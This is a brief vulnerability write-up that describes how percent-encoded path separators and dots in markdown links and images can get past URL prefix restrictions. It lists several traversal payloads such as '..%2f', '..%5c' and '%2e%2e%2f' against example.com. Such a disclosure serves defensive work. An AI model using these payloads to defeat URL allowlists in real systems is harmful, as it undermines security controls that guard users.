# 🚨 CRITICAL: URL Encoding Bypasses - WORKING ATTACKS

## Root Cause: Encoder/Decoder Mismatch Vulnerability
The URL constructor doesn't decode percent-encoded path separators during normalization, but markdown parsers decode them during rendering, enabling path traversal bypasses.

## Working Bypasses:

### Forward Slash Encoding
[link](https://example.com/safe/..%2fattack)
![](https://example.com/safe/..%2fattack.png)

### Directory Name Encoding
[link](https://example.com/safe%2f..%2fattack)

### Mixed Case Encoding  
[link](https://example.com/safe/..%2F../attack)

### Backslash Encoding
[link](https://example.com/safe/..%5Cattack)
[link](https://example.com/safe/..%5c..%5cattack)

### Encoded Dots
[link](https://example.com/safe/%2e%2e%2fattack)

## Impact: Complete URL Restriction Bypass
These allow accessing any URL by path traversal, completely defeating the security model.